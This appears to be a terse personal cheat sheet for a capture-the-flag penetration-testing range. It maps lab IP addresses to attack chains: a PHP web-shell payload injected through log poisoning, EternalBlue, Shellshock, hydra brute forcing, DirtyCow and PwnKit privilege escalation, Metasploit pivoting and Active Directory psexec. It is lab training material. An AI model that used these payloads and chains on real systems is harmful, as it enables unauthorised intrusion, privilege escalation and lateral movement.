# penetration_test_guide
CTF Range		
	172.25.20.6	site-editor 1.1.1 → '<?php system($_GET['cmd']); ?>' → path=/var/log/auth.log&cmd
	172.25.30.4	ms17_010_ps
	172.25.30.5	gobuster/dirb cgi_bash
	172.25.20.7	hydra(jason) → ubuntu 18 lxd
Pivoting and Double Pivoting		
	192.168.65.200	hydra(vagrant) → ssh
	192.168.65.210	burpsuite dirtycow
	192.168.5.100	ssh_login(200vagrant) → sessions -u 1 → route add 192.168.5.0/24 1 → portscan → smb_login → smb/psexec
	192.168.35.100	ms17_010_command nbtstat -A 192.168.35.100
	192.168.5.230	portscan → ssh_login(jason) → PwnKit
Active Directory Range		前置smb_login(mulit)
	172.25.170.20	smb_version → smb/ps
	172.25.170.30	nmap445 & hydra → smb/p (nla) → rdesktop
	172.25.170.200	nmap445 & ms17_010_psexec → rdesktop → nbtstat -n
	172.25.170.90	ms17_010_psexec
	172.25.170.70	ms17_010/eternal
OT Range		
	172.25.100.105	nmap(X) → portscan(msfconsole)→ hydra(kevin) → rdesktop
	192.168.110.230	nmap → hydra(kevin) → ssh[sudo -s]
	others : tcpdump tcp port 502 -i eth0 -vv -w /tmp/test.cap	
Binaries & IoT Range Range		
	172.25.120.100	binwalk -e → grep -nir anonymous
	172.25.120.210	 gdb /bin/bash → b main → info registers
	172.25.120.220	
	others : gdb binaries-two → find /bin/bash
